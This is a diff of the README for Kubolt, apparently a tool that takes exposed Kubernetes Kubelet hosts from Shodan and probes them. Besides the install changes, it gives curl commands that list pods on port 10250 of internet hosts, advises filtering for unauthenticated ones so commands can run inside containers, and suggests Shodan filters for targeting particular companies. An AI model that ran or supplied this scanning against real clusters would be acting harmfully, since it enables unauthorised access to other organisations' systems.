@@ -16,11 +16,17 @@ func (s *Server) getRun(request *restful.Request, response *restful.Response) {
 ```
 
 # Install 
-Using virtualenv
+
+**Using virtualenv**  
 ```python
 virtualenv -p python3 kubolt3
 source kubolt3/bin/activate
 pip install -r requirements.txt
+```
+**Using poetry**
+```python
+poetry install
+poetry run python kubolt.py
 ```
 
 # How?
@@ -34,12 +40,14 @@ The basic query is
 **Kubolt** asks Shodan by API for list of IP addresses and keeps them for other OSINT actions :grin:
 
 Firstly, let's ask Kubelet for running pods and filter hosts where response doesn't contain `Unauthorized` and contains `container` so we can run command inside it. 
+
 ```bash
 curl -k https://IP-from-Shodan:10250/runningpods/ 
 ```
 Anyway, if you find the host without any running pods at the time, keep it for next time when pods might be started :grin: 
 
 You can list all available pods from these requests:
+
 ```bash
 curl -k https://IP-from-Shodan:10250/pods/
 #or
@@ -55,12 +63,6 @@ You can target companies more accurate using Shodan filters such as:
 - org
 - country
 - net
-
-# Install 
-```bash
-mkdir output
-pip install -r requirements.txt 
-```
 
 # Run
 ```python3
